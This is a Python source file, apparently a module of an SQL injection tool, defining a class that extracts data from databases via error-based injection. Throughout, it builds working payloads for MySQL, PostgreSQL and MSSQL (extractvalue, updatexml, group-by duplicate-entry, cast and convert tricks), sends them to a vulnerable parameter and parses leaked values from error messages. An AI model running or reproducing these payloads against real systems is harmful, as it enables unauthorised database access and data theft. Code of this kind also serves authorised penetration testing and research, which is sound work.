import re
import logging

logger = logging.getLogger(__name__)

class ErrorExploit:
    def __init__(self, request, vuln, settings):
        self.request = request
        self.vuln = vuln
        self.settings = settings

    def extract_data(self, expression, dbms="MySQL"):
        """Extract data using error-based technique"""
        if dbms == "MySQL":
            payloads = [
                f"{self.vuln['original_value']}' AND extractvalue(1,concat(0x7e,({expression})))-- -",
                f"{self.vuln['original_value']}' AND updatexml(1,concat(0x7e,({expression})),1)-- -",
                f"{self.vuln['original_value']}' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(({expression}),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- -"
            ]
        elif dbms == "PostgreSQL":
            payloads = [
                f"{self.vuln['original_value']}' AND 1=cast(({expression})::text as int)-- -"
            ]
        elif dbms == "MSSQL":
            payloads = [
                f"{self.vuln['original_value']}' AND 1=convert(int,({expression}))-- -"
            ]
        else:
            return None

        for payload in payloads:
            resp = self.request.send(self.vuln['param'], payload, self.vuln['location'])
            if resp and "error" in resp.text.lower():
                # Extract data between markers (e.g., ~data)
                match = re.search(r'~(.+?)[~\'"]', resp.text, re.DOTALL)
                if match:
                    return match.group(1)
                # For MySQL group by error, data appears in duplicate entry
                match = re.search(r'Duplicate entry \'(.+?)\'', resp.text, re.DOTALL)
                if match:
                    return match.group(1)
        return None